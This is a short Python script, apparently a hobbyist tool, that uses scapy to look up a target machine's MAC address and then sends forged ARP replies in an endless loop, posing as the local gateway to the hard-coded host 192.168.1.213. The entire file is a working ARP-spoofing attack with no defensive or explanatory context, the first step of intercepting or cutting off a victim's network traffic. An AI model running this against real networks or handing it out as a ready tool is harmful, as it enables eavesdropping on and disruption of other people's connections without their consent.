import scapy.all as scapy

def get_MAC(target_ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target_ip)
    reply, _ = scapy.srp(arp_request,timeout=3,verbose=0)
    if reply:
        return reply[0][1].src
    return None

def spoof(target_ip,target_mac,spoof_ip):
    spoofed_arp_packet = scapy.ARP(pdst=target_ip,hwdst=target_mac,psrc=spoof_ip, op="is-at")
    scapy.send(spoofed_arp_packet, verbose=0)


def main():
    target_ip = "192.168.1.213"
    getway_ip = "192.168.1.1"
    target_mac = None
    while not target_mac:
        target_mac = get_MAC(target_ip)
        if not target_mac:
            print("MAC adress was not found...")
    print("The MAC adress is:{}".format(target_mac))
    print("spoofer is active!")
    while True:
        spoof(target_ip,target_mac,getway_ip)

if __name__=="__main__":
    main()